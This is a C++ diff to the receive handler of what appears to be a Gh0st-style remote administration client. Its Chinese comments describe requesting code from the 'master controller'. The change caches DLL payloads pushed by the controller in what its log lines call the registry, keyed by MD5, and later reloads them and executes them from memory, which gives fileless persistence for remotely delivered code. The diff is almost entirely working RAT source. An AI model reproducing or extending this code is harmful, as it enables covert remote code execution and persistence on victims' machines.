@@ -265,13 +265,31 @@ VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
 		const char* md5 = info->Md5;
 		auto find = m_MemDLL.find(md5);
 		if (find == m_MemDLL.end() && ulLength == sz) {
-			// 第一个命令没有包含DLL数据，需客户端检测本地是否已经有相关DLL，没有则向主控请求执行代码
-			m_ClientObject->Send2Server((char*)szBuffer, ulLength);
-			break;
+			iniFile cfg(CLIENT_PATH);
+			auto md5 = cfg.GetStr("settings", info->Name + std::string(".md5"));
+			if (md5.empty() || md5 != info->Md5) {
+				// 第一个命令没有包含DLL数据，需客户端检测本地是否已经有相关DLL，没有则向主控请求执行代码
+				m_ClientObject->Send2Server((char*)szBuffer, ulLength);
+				break;
+			}
+			Mprintf("Execute local DLL from registry: %s\n", md5.c_str());
+			binFile bin(CLIENT_PATH);
+			auto local = bin.GetStr("settings", info->Name + std::string(".bin"));
+			const BYTE* bytes = reinterpret_cast<const BYTE*>(local.data());
+			m_MemDLL[md5] = std::vector<BYTE>(bytes + sz, bytes + sz + info->Size);
+			find = m_MemDLL.find(md5);
 		}
 		BYTE* data = find != m_MemDLL.end() ? find->second.data() : NULL;
 		if (info->Size == ulLength - sz && info->RunType == MEMORYDLL) {
-			if (md5[0]) m_MemDLL[md5] = std::vector<BYTE>(szBuffer + sz, szBuffer + sz + info->Size);
+			if (md5[0]) {
+				m_MemDLL[md5] = std::vector<BYTE>(szBuffer + sz, szBuffer + sz + info->Size);
+				iniFile cfg(CLIENT_PATH);
+				cfg.SetStr("settings", info->Name + std::string(".md5"), md5);
+				binFile bin(CLIENT_PATH);
+				std::string buffer(reinterpret_cast<const char*>(szBuffer), ulLength);
+				bin.SetStr("settings", info->Name + std::string(".bin"), buffer);
+				Mprintf("Save DLL to registry: %s\n", md5);
+			}
 			data = szBuffer + sz;
 		}
 		if (data) {
